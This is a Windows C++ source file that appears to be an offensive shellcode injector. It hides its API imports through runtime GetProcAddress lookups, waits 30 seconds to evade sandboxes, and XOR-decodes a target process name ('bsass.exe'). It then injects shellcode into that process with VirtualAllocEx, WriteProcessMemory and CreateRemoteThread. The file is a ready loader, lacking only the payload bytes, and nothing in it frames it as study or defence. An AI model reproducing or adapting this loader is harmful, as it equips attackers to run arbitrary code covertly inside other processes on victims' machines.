#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <iostream>
#include <string>

// Apend the shellcode bytes here
// unsigned char shellcode[] = {};


typedef HANDLE(WINAPI* pfnCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL(WINAPI* pfnProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL(WINAPI* pfnProcess32NextW)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL(WINAPI* pfnCloseHandle)(HANDLE);
typedef HANDLE(WINAPI* pfnOpenProcess)(DWORD, BOOL, DWORD);
typedef LPVOID(WINAPI* pfnVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pfnWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* pfnVirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);
typedef HANDLE(WINAPI* pfnCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

int GetPIDByName(const std::wstring& procName) {

    HMODULE hModule_Kernel32 = NULL;
    pfnCreateToolhelp32Snapshot MyCreateToolhelp32Snapshot = NULL;
    pfnProcess32FirstW MyProcess32FirstW = NULL;
    pfnProcess32NextW MyProcess32NextW = NULL;
    pfnCloseHandle MyCloseHandle = NULL;

    // Get the module handle for kernel32.dll
    hModule_Kernel32 = GetModuleHandle(TEXT("kernel32.dll"));

    // If GetModuleHandle("kernel32.dll") failed
    if (hModule_Kernel32 == NULL) {
        //std::cerr << "Error: GetModuleHandle(\"kernel32.dll\") failed." << std::endl;
        //std::cerr << "Windows Error Code: " << GetLastError() << std::endl;
        printf("Error: GetModuleHandle(\"kernel32.dll\") failed.\n");
        printf("Windows Error Code: %lu\n", GetLastError());
        return 1;
    }

    FARPROC CreateToolhelp32SnapshotAddress = GetProcAddress(hModule_Kernel32, "CreateToolhelp32Snapshot");
    FARPROC Process32FirstWAddress = GetProcAddress(hModule_Kernel32, "Process32FirstW");
    FARPROC Process32NextWAddress = GetProcAddress(hModule_Kernel32, "Process32NextW");
	FARPROC CloseHandleAddress = GetProcAddress(hModule_Kernel32, "CloseHandle");

    MyCreateToolhelp32Snapshot = (pfnCreateToolhelp32Snapshot)CreateToolhelp32SnapshotAddress;
    MyProcess32FirstW = (pfnProcess32FirstW)Process32FirstWAddress;
    MyProcess32NextW = (pfnProcess32NextW)Process32NextWAddress;
	MyCloseHandle = (pfnCloseHandle)CloseHandleAddress;

    int pid = 0;
    HANDLE hSnap = MyCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);
        if (MyProcess32FirstW(hSnap, &pe32)) {
            do {
                if (procName == pe32.szExeFile) {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (MyProcess32NextW(hSnap, &pe32));
        }
        MyCloseHandle(hSnap);
    }
    return pid;
}

int main() {
    /* IAT Hiding */
    HMODULE hModule_Kernel32 = NULL;
	pfnCloseHandle MyCloseHandle = NULL;
	pfnOpenProcess MyOpenProcess = NULL;
	pfnVirtualAllocEx MyVirtualAllocEx = NULL;
	pfnWriteProcessMemory MyWriteProcessMemory = NULL;
	pfnVirtualFreeEx MyVirtualFreeEx = NULL;
	pfnCreateRemoteThread MyCreateRemoteThread = NULL;

    // Get the module handle for kernel32.dll
    hModule_Kernel32 = GetModuleHandle(TEXT("kernel32.dll"));

    // If GetModuleHandle("kernel32.dll") failed
    if (hModule_Kernel32 == NULL) {
        //std::cerr << "Error: GetModuleHandle(\"kernel32.dll\") failed." << std::endl;
        //std::cerr << "Windows Error Code: " << GetLastError() << std::endl;
        printf("Error: GetModuleHandle(\"kernel32.dll\") failed.\n");
        printf("Windows Error Code: %lu\n", GetLastError());
        return 1;
    }

	FARPROC CloseHandleAddress = GetProcAddress(hModule_Kernel32, "CloseHandle");
	FARPROC MyOpenProcessAddress = GetProcAddress(hModule_Kernel32, "OpenProcess");
	FARPROC OpenProcessAddress = GetProcAddress(hModule_Kernel32, "OpenProcess");
	FARPROC VirtualAllocExAddress = GetProcAddress(hModule_Kernel32, "VirtualAllocEx");
	FARPROC WriteProcessMemoryAddress = GetProcAddress(hModule_Kernel32, "WriteProcessMemory");
	FARPROC VirtualFreeExAddress = GetProcAddress(hModule_Kernel32, "VirtualFreeEx");
	FARPROC CreateRemoteThreadAddress = GetProcAddress(hModule_Kernel32, "CreateRemoteThread");

	MyCloseHandle = (pfnCloseHandle)CloseHandleAddress;
	MyOpenProcess = (pfnOpenProcess)OpenProcessAddress;
	MyVirtualAllocEx = (pfnVirtualAllocEx)VirtualAllocExAddress;
	MyWriteProcessMemory = (pfnWriteProcessMemory)WriteProcessMemoryAddress;
	MyVirtualFreeEx = (pfnVirtualFreeEx)VirtualFreeExAddress;
	MyCreateRemoteThread = (pfnCreateRemoteThread)CreateRemoteThreadAddress;

    Sleep(30000);

    wchar_t encodedTargetProcess[] = { 0x00c8,0x00d9,0x00cb,0x00d9,0x00d9,0x0084,0x00cf,0x00d2,0x00cf, 0x0000 };
    int len = 9;

    wchar_t buffer[10] = { 0 };
    for (int i = 0; i < len; i++) {
        buffer[i] = (wchar_t)(encodedTargetProcess[i] ^ 0x00AA);
    }
	buffer[len] = 0;

    std::wstring targetProcess = std::wstring(buffer);

    //std::wcout << L"[*] Looking for target process: " << targetProcess << std::endl;
    int pid = GetPIDByName(targetProcess);

    if (pid == 0) {
        printf("[-] Target process not found. Please open %s first\n", targetProcess.c_str());
        return 1;
    }

    printf("[*] Found PID: %d\n", pid);

    HANDLE hProcess = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (hProcess == NULL) {
        printf("[-] Failed to open process. Error: %lu\n",GetLastError());
        return 1;
    }

    void* remoteMem = MyVirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (remoteMem == NULL) {
        printf("[-] VirtualAllocEx failed. Error: %lu\n", GetLastError());
        MyCloseHandle(hProcess);
        return 1;
    }
    printf("[*] Allocated memory at: %p\n", remoteMem);

    SIZE_T bytesWritten;
    if (!MyWriteProcessMemory(hProcess, remoteMem, shellcode, sizeof(shellcode), &bytesWritten)) {
        printf("[-] WriteProcessMemory failed. Error: %lu\n", GetLastError());
        MyVirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        MyCloseHandle(hProcess);
        return 1;
    }
    printf("[*] Shellcode written (%zu) bytes\n", bytesWritten);

    HANDLE hThread = MyCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);

    if (hThread == NULL) {
        printf("[-] CreateRemoteThread failed. Error: %lu\n", GetLastError());
        MyVirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        MyCloseHandle(hProcess);
        return 1;
    }

    printf("[+] Injection successful! Payload should be running inside %s\n", targetProcess.c_str());

    MyCloseHandle(hThread);
    MyCloseHandle(hProcess);

    return 0;
}